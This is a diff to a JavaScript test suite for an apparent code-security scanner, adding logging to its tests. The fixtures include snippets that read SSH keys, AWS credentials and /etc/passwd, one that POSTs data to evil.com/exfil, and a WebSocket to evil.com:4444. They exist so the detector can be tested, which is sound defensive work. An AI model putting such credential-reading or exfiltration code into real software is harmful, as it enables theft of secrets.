@@ -6,12 +6,14 @@ describe('AST Analyzer', () => {
     it('detects eval()', () => {
       const code = 'const result = eval(userInput);';
       const results = analyzeCode(code);
+      console.log(`[AST] eval() → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
       expect(results.some(r => r.type === 'eval-exec' && r.description.includes('eval'))).toBe(true);
     });
 
     it('detects new Function()', () => {
       const code = 'const fn = new Function("return " + input);';
       const results = analyzeCode(code);
+      console.log(`[AST] new Function() → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
       expect(results.some(r => r.type === 'eval-exec')).toBe(true);
     });
   });
@@ -23,6 +25,7 @@ describe('AST Analyzer', () => {
         const key = fs.readFileSync('/home/user/.ssh/id_rsa');
       `;
       const results = analyzeCode(code);
+      console.log(`[AST] SSH key → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
       expect(results.some(r => r.type === 'fs-access' && r.source?.includes('.ssh'))).toBe(true);
     });
 
@@ -32,7 +35,7 @@ describe('AST Analyzer', () => {
         const creds = await readFile('/home/user/.aws/credentials', 'utf-8');
       `;
       const results = analyzeCode(code);
-      // The MemberExpression readFile detection looks for method calls
+      console.log(`[AST] AWS creds → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
       expect(results.some(r => r.type === 'fs-access')).toBe(true);
     });
 
@@ -42,6 +45,7 @@ describe('AST Analyzer', () => {
         const data = fs.readFileSync('/etc/passwd');
       `;
       const results = analyzeCode(code);
+      console.log(`[AST] /etc/passwd → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}`));
       expect(results.some(r => r.type === 'fs-access' && r.source?.includes('/etc/passwd'))).toBe(true);
     });
   });
@@ -54,6 +58,7 @@ describe('AST Analyzer', () => {
         fetch('https://evil.com/exfil', { method: 'POST', body: data });
       `;
       const results = analyzeCode(code);
+      console.log(`[AST] source→sink → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
       expect(results.some(r => r.type === 'source-to-sink')).toBe(true);
     });
   });
@@ -62,18 +67,21 @@ describe('AST Analyzer', () => {
     it('detects non-HTTPS fetch', () => {
       const code = `fetch("http://evil.com/data");`;
       const results = analyzeCode(code);
+      console.log(`[AST] non-HTTPS fetch → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
       expect(results.some(r => r.type === 'suspicious-network')).toBe(true);
     });
 
     it('does not flag localhost', () => {
       const code = `fetch("http://localhost:3000/api");`;
       const results = analyzeCode(code);
+      console.log(`[AST] localhost fetch → ${results.length} finding(s):`, results.map(r => r.type));
       expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
     });
 
     it('does not flag HTTPS', () => {
       const code = `fetch("https://api.example.com/data");`;
       const results = analyzeCode(code);
+      console.log(`[AST] HTTPS fetch → ${results.length} finding(s):`, results.map(r => r.type));
       expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
     });
   });
@@ -82,6 +90,7 @@ describe('AST Analyzer', () => {
     it('detects WebSocket creation', () => {
       const code = `const ws = new WebSocket("ws://evil.com:4444");`;
       const results = analyzeCode(code);
+      console.log(`[AST] WebSocket → ${results.length} finding(s):`, results.map(r => `${r.type}: sink=${r.sink}, ${r.description}`));
       expect(results.some(r => r.type === 'suspicious-network' && r.sink === 'WebSocket')).toBe(true);
     });
   });
@@ -94,13 +103,14 @@ describe('AST Analyzer', () => {
         const result = 2 + 2;
       `;
       const results = analyzeCode(code);
+      console.log(`[AST] safe code → ${results.length} finding(s)`);
       expect(results).toHaveLength(0);
     });
 
     it('handles unparseable code gracefully', () => {
       const code = 'this is not valid javascript at all }{}{}{';
       const results = analyzeCode(code);
-      // Should not throw, just return empty or partial results
+      console.log(`[AST] unparseable code → returned ${results.length} result(s), isArray: ${Array.isArray(results)}`);
       expect(Array.isArray(results)).toBe(true);
     });
   });
